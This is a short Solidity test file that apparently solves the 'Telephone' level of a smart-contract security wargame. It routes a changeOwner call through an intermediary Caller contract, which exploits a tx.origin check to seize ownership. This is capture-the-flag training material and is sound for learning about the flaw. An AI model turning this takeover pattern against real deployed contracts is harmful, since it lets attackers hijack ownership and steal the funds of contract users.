// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {TelephoneFactory} from "../src/levels/04-TelephoneFactory.sol";
import {Telephone} from "../src/levels/04-Telephone.sol";

contract Caller {
    function dial(Telephone telephone) external {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneSolution is BaseTest {

    function solution(address payable target_) internal override{
        Telephone target = Telephone(target_);
        (new Caller()).dial(target);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new TelephoneFactory()));
    }
}
